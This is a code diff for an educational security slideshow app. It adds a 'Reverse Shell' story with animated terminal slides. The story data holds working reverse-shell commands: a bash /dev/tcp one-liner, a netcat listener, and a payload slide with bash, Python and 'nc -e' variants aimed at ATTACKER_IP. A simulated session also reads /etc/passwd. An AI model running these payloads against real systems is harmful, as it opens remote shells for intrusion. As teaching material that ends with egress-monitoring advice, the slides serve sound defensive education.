@@ -35,6 +35,18 @@ interface CodeLine {
   type: string;
 }
 
+interface TerminalLine {
+  text: string;
+  type: 'command' | 'output' | 'comment' | 'prompt' | 'error' | 'success';
+  delay?: number;
+}
+
+interface TerminalConfig {
+  title: string;
+  lines: TerminalLine[];
+  side?: 'attacker' | 'victim';
+}
+
 interface Slide {
   type: string;
   title?: string;
@@ -52,6 +64,7 @@ interface Slide {
   lines?: CodeLine[];
   stage?: number;
   mapType?: string;
+  terminals?: TerminalConfig[];
 }
 
 interface Story {
@@ -63,6 +76,176 @@ interface Story {
 
 // All Stories
 const stories: Record<string, Story> = {
+  reverseShell: {
+    id: "reverseShell",
+    title: "Reverse Shell",
+    subtitle: "How Hackers Get Remote Access",
+    slides: [
+      {
+        type: "title",
+        title: "REVERSE SHELL",
+        subtitle: "How Hackers Bypass Firewalls"
+      },
+      {
+        type: "text",
+        content: "What if the <span class='highlight-red'>victim</span> connects to <span class='highlight'>you</span>?",
+        subtext: "Instead of you connecting to them."
+      },
+      {
+        type: "text",
+        content: "That's a <span class='highlight'>Reverse Shell</span>",
+        subtext: "The target initiates the connection outward."
+      },
+      {
+        type: "bigNumber",
+        number: "🔥",
+        label: "Bypasses inbound firewall rules"
+      },
+      {
+        type: "network",
+        title: "Normal Shell vs Reverse Shell",
+        nodes: [
+          { id: "attacker", label: "Attacker", x: 15, y: 50 },
+          { id: "firewall", label: "🧱 Firewall", x: 50, y: 50 },
+          { id: "victim", label: "Victim", x: 85, y: 50, infected: true }
+        ],
+        connections: [
+          { from: "attacker", to: "firewall", attack: true },
+          { from: "firewall", to: "victim" }
+        ]
+      },
+      {
+        type: "text",
+        content: "Firewalls <span class='highlight-red'>block</span> incoming connections",
+        subtext: "But they usually allow outgoing traffic..."
+      },
+      {
+        type: "network",
+        title: "Reverse Shell: Victim Connects Out",
+        nodes: [
+          { id: "victim", label: "Victim", x: 15, y: 50, infected: true },
+          { id: "firewall", label: "🧱 Firewall", x: 50, y: 50 },
+          { id: "attacker", label: "Attacker", x: 85, y: 50 }
+        ],
+        connections: [
+          { from: "victim", to: "firewall", attack: true },
+          { from: "firewall", to: "attacker", attack: true }
+        ]
+      },
+      {
+        type: "text",
+        content: "Outbound traffic = <span class='highlight'>Trusted</span>",
+        subtext: "The connection looks legitimate to the firewall."
+      },
+      { type: "reverseShellFlow", stage: 0 },
+      { type: "reverseShellFlow", stage: 1 },
+      { type: "reverseShellFlow", stage: 2 },
+      { type: "reverseShellFlow", stage: 3 },
+      {
+        type: "terminal",
+        title: "Step 1: Attacker Listens",
+        terminals: [
+          {
+            title: "ATTACKER (Kali Linux)",
+            side: "attacker",
+            lines: [
+              { text: "root@kali:~#", type: "prompt" },
+              { text: " nc -lvnp 4444", type: "command" },
+              { text: "listening on [any] 4444 ...", type: "output", delay: 800 }
+            ]
+          }
+        ]
+      },
+      {
+        type: "terminal",
+        title: "Step 2: Victim Executes Payload",
+        terminals: [
+          {
+            title: "VICTIM (Target Server)",
+            side: "victim",
+            lines: [
+              { text: "user@server:~$", type: "prompt" },
+              { text: " bash -i >& /dev/tcp/10.10.14.5/4444 0>&1", type: "command" }
+            ]
+          }
+        ]
+      },
+      {
+        type: "terminal",
+        title: "Step 3: Connection Established!",
+        terminals: [
+          {
+            title: "ATTACKER (Kali Linux)",
+            side: "attacker",
+            lines: [
+              { text: "listening on [any] 4444 ...", type: "output" },
+              { text: "connect to [10.10.14.5] from (UNKNOWN) [10.10.10.100] 52412", type: "success", delay: 500 },
+              { text: "user@server:~$", type: "prompt", delay: 300 },
+              { text: " whoami", type: "command", delay: 200 },
+              { text: "user", type: "output", delay: 400 },
+              { text: "user@server:~$", type: "prompt", delay: 200 },
+              { text: " id", type: "command", delay: 200 },
+              { text: "uid=1000(user) gid=1000(user) groups=1000(user)", type: "output", delay: 400 },
+              { text: "user@server:~$", type: "prompt", delay: 200 },
+              { text: " cat /etc/passwd | head -3", type: "command", delay: 200 },
+              { text: "root:x:0:0:root:/root:/bin/bash", type: "output", delay: 200 },
+              { text: "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin", type: "output", delay: 100 },
+              { text: "bin:x:2:2:bin:/bin:/usr/sbin/nologin", type: "output", delay: 100 }
+            ]
+          }
+        ]
+      },
+      {
+        type: "code",
+        title: "Common Reverse Shell Payloads",
+        lines: [
+          { text: "# Bash", type: "comment" },
+          { text: "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", type: "normal" },
+          { text: "", type: "normal" },
+          { text: "# Python", type: "comment" },
+          { text: "python -c 'import socket,os,pty;s=socket.socket();", type: "normal" },
+          { text: "s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);", type: "normal" },
+          { text: "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", type: "normal" },
+          { text: "", type: "normal" },
+          { text: "# Netcat", type: "comment" },
+          { text: "nc -e /bin/bash ATTACKER_IP PORT", type: "normal" }
+        ]
+      },
+      {
+        type: "stats",
+        items: [
+          { value: "4444", label: "Classic Port" },
+          { value: "443", label: "Stealthy (HTTPS)" },
+          { value: "53", label: "Sneaky (DNS)" },
+          { value: "80", label: "Common (HTTP)" }
+        ]
+      },
+      {
+        type: "text",
+        content: "<span class='highlight-purple'>Defense:</span> Monitor outbound connections",
+        subtext: "Egress filtering and anomaly detection."
+      },
+      {
+        type: "attackTree",
+        root: "Establish Reverse Shell",
+        phases: [
+          ["Reconnaissance", "Delivery", "Execution"],
+          ["Find Open Port", "Phishing/Exploit", "Payload Runs"]
+        ]
+      },
+      {
+        type: "text",
+        content: "Reverse shells are <span class='highlight-red'>everywhere</span>",
+        subtext: "Used in CTFs, penetration testing, and real attacks."
+      },
+      {
+        type: "title",
+        title: "KEY TAKEAWAYS",
+        subtitle: "Victim connects out • Bypasses firewalls • Monitor egress traffic"
+      }
+    ]
+  },
+  
   stuxnet: {
     id: "stuxnet",
     title: "Stuxnet",
@@ -630,6 +813,241 @@ function DesktopAttackStage({ stage }: { stage: number }) {
   );
 }
 
+// Terminal Component with typing animation
+function Terminal({ config, isActive }: { config: TerminalConfig; isActive: boolean }) {
+  const [visibleLines, setVisibleLines] = useState<number>(0);
+  const [typingIndex, setTypingIndex] = useState<number>(0);
+  const [currentText, setCurrentText] = useState<string>("");
+  
+  useEffect(() => {
+    if (!isActive) {
+      setVisibleLines(0);
+      setTypingIndex(0);
+      setCurrentText("");
+      return;
+    }
+    
+    const lines = config.lines;
+    if (visibleLines >= lines.length) return;
+    
+    const currentLine = lines[visibleLines];
+    const fullText = currentLine.text;
+    const delay = currentLine.delay || 0;
+    
+    // If it's a command type, type it character by character
+    if (currentLine.type === 'command' && typingIndex < fullText.length) {
+      const timer = setTimeout(() => {
+        setCurrentText(fullText.slice(0, typingIndex + 1));
+        setTypingIndex(prev => prev + 1);
+      }, 30 + Math.random() * 40);
+      return () => clearTimeout(timer);
+    }
+    
+    // When typing is complete or it's not a command, show full line and move to next
+    if (currentLine.type !== 'command' || typingIndex >= fullText.length) {
+      const timer = setTimeout(() => {
+        setVisibleLines(prev => prev + 1);
+        setTypingIndex(0);
+        setCurrentText("");
+      }, currentLine.type === 'command' ? 200 : delay + 100);
+      return () => clearTimeout(timer);
+    }
+  }, [isActive, visibleLines, typingIndex, config.lines]);
+  
+  return (
+    <div className={`terminal ${config.side || 'default'}`}>
+      <div className="terminal-header">
+        <div className="terminal-buttons">
+          <span className="terminal-btn red" />
+          <span className="terminal-btn yellow" />
+          <span className="terminal-btn green" />
+        </div>
+        <span className="terminal-title">{config.title}</span>
+      </div>
+      <div className="terminal-body">
+        {config.lines.slice(0, visibleLines).map((line, i) => (
+          <div key={i} className={`terminal-line ${line.type}`}>
+            {line.text}
+          </div>
+        ))}
+        {visibleLines < config.lines.length && config.lines[visibleLines].type === 'command' && (
+          <div className={`terminal-line ${config.lines[visibleLines].type}`}>
+            {config.lines[visibleLines - 1]?.type === 'prompt' ? '' : ''}
+            {currentText}
+            <span className="cursor">▊</span>
+          </div>
+        )}
+        {visibleLines < config.lines.length && config.lines[visibleLines].type === 'prompt' && (
+          <div className="terminal-line prompt">
+            {config.lines[visibleLines].text}
+            <span className="cursor">▊</span>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+// Terminal Slide Component
+function TerminalSlide({ slide }: { slide: Slide }) {
+  return (
+    <div className="terminal-slide">
+      <h2 className="slide-subtitle mb-4">{slide.title}</h2>
+      <div className={`terminals-container ${slide.terminals?.length === 2 ? 'dual' : 'single'}`}>
+        {slide.terminals?.map((terminal, i) => (
+          <Terminal key={i} config={terminal} isActive={true} />
+        ))}
+      </div>
+    </div>
+  );
+}
+
+// Reverse Shell Flow - shows the connection stages
+function ReverseShellFlow({ stage, isMobile = false }: { stage: number; isMobile?: boolean }) {
+  const [packetProgress, setPacketProgress] = useState(0);
+  const prevStageRef = useRef(stage);
+  
+  useEffect(() => {
+    if (prevStageRef.current !== stage) {
+      setPacketProgress(0);
+      prevStageRef.current = stage;
+    }
+    const interval = setInterval(() => {
+      setPacketProgress(p => Math.min(1, p + 0.02));
+    }, 30);
+    return () => clearInterval(interval);
+  }, [stage]);
+  
+  const stages = [
+    { 
+      title: "ATTACKER LISTENS", 
+      desc: "Opens a port and waits for incoming connection",
+      attacker: { icon: '🎧', label: 'Listening', status: 'waiting' },
+      victim: { icon: '💻', label: 'Target', status: 'normal' },
+      direction: 'none'
+    },
+    { 
+      title: "PAYLOAD DELIVERED", 
+      desc: "Malicious code reaches the victim (phishing, exploit, etc.)",
+      attacker: { icon: '🎧', label: 'Listening', status: 'waiting' },
+      victim: { icon: '📧', label: 'Payload', status: 'infected' },
+      direction: 'to-victim'
+    },
+    { 
+      title: "VICTIM EXECUTES", 
+      desc: "Victim unknowingly runs the reverse shell payload",
+      attacker: { icon: '🎧', label: 'Listening', status: 'waiting' },
+      victim: { icon: '💥', label: 'Executing', status: 'infected' },
+      direction: 'none'
+    },
+    { 
+      title: "CONNECTION ESTABLISHED", 
+      desc: "Victim connects OUTBOUND to attacker — Shell access granted!",
+      attacker: { icon: '🖥️', label: 'Shell!', status: 'success' },
+      victim: { icon: '🔓', label: 'Compromised', status: 'infected' },
+      direction: 'to-attacker'
+    }
+  ];
+  
+  const current = stages[stage];
+  
+  if (isMobile) {
+    return (
+      <div className="mobile-attack reverse-shell">
+        <div className="mobile-attack-header">
+          <span className="mobile-stage-num">STAGE {stage + 1}/4</span>
+          <h3 className="mobile-stage-title">{current.title}</h3>
+        </div>
+        
+        <div className="reverse-shell-visual-mobile">
+          <div className={`rs-node ${current.attacker.status}`}>
+            <span className="rs-icon">{current.attacker.icon}</span>
+            <span className="rs-label">ATTACKER</span>
+            <span className="rs-status">{current.attacker.label}</span>
+          </div>
+          
+          {current.direction !== 'none' && (
+            <div className={`rs-arrow ${current.direction}`}>
+              <div className="rs-arrow-line" />
+              <div className="rs-packet" style={{ 
+                animationDirection: current.direction === 'to-attacker' ? 'reverse' : 'normal' 
+              }} />
+              <span className="rs-arrow-icon">{current.direction === 'to-attacker' ? '▲' : '▼'}</span>
+            </div>
+          )}
+          {current.direction === 'none' && <div className="rs-spacer" />}
+          
+          <div className={`rs-node ${current.victim.status}`}>
+            <span className="rs-icon">{current.victim.icon}</span>
+            <span className="rs-label">VICTIM</span>
+            <span className="rs-status">{current.victim.label}</span>
+          </div>
+        </div>
+        
+        <p className="mobile-stage-desc">{current.desc}</p>
+        
+        <div className="mobile-progress">
+          {stages.map((_, i) => (
+            <div key={i} className={`mobile-progress-dot ${i <= stage ? 'active' : ''} ${i === stage ? 'current' : ''}`} />
+          ))}
+        </div>
+      </div>
+    );
+  }
+  
+  // Desktop horizontal layout
+  return (
+    <div className="attack-flow reverse-shell-flow">
+      <div className="attack-header">
+        <span className="attack-stage-num">STAGE {stage + 1}/4</span>
+        <h3 className="attack-stage-title">{current.title}</h3>
+        <p className="attack-stage-desc">{current.desc}</p>
+      </div>
+      
+      <div className="rs-diagram">
+        <div className={`rs-endpoint attacker ${current.attacker.status}`}>
+          <div className="rs-endpoint-icon">{current.attacker.icon}</div>
+          <div className="rs-endpoint-label">ATTACKER</div>
+          <div className="rs-endpoint-status">{current.attacker.label}</div>
+          <div className="rs-ip">10.10.14.5:4444</div>
+        </div>
+        
+        <div className="rs-connection">
+          <div className="rs-firewall">
+            <span>🧱</span>
+            <span className="rs-firewall-label">Firewall</span>
+          </div>
+          <svg className="rs-line" viewBox="0 0 100 20">
+            <line x1="0" y1="10" x2="100" y2="10" className={`rs-path ${current.direction !== 'none' ? 'active' : ''}`} />
+          </svg>
+          {current.direction !== 'none' && (
+            <div 
+              className={`rs-packet-desktop ${current.direction}`}
+              style={{ left: current.direction === 'to-attacker' ? `${(1 - packetProgress) * 100}%` : `${packetProgress * 100}%` }}
+            />
+          )}
+        </div>
+        
+        <div className={`rs-endpoint victim ${current.victim.status}`}>
+          <div className="rs-endpoint-icon">{current.victim.icon}</div>
+          <div className="rs-endpoint-label">VICTIM</div>
+          <div className="rs-endpoint-status">{current.victim.label}</div>
+          <div className="rs-ip">10.10.10.100</div>
+        </div>
+      </div>
+      
+      <div className="rs-progress">
+        {stages.map((s, i) => (
+          <div key={i} className={`rs-progress-step ${i <= stage ? 'active' : ''} ${i === stage ? 'current' : ''}`}>
+            <div className="rs-progress-dot" />
+            <span className="rs-progress-label">{i + 1}</span>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
 // Compact Attack Stage for small 16:9 viewports
 function CompactAttackStage({ stage }: { stage: number }) {
   const stages = [
@@ -750,7 +1168,7 @@ function ParticleNetwork() {
 }
 
 export default function Home() {
-  const [currentStory, setCurrentStory] = useState<string>("stuxnet");
+  const [currentStory, setCurrentStory] = useState<string>("reverseShell");
   const [currentSlide, setCurrentSlide] = useState(0);
   const [ratio, setRatio] = useState<"16:9" | "9:16">("16:9");
   const [animationKey, setAnimationKey] = useState(0);
@@ -943,6 +1361,20 @@ export default function Home() {
           </div>
         );
 
+      case "terminal":
+        return (
+          <div className="slide-content terminal-content" key={animationKey}>
+            <TerminalSlide slide={slide} />
+          </div>
+        );
+
+      case "reverseShellFlow":
+        return (
+          <div className="slide-content attack-flow-slide" key={animationKey}>
+            <ReverseShellFlow stage={slide.stage || 0} isMobile={ratio === "9:16"} />
+          </div>
+        );
+
       default:
         return null;
     }
@@ -956,6 +1388,7 @@ export default function Home() {
           value={currentStory} 
           onChange={(e) => switchStory(e.target.value)}
         >
+          <option value="reverseShell">🐚 Reverse Shell</option>
           <option value="stuxnet">🦠 Stuxnet</option>
           <option value="coupang">🛒 Coupang Breach</option>
         </select>
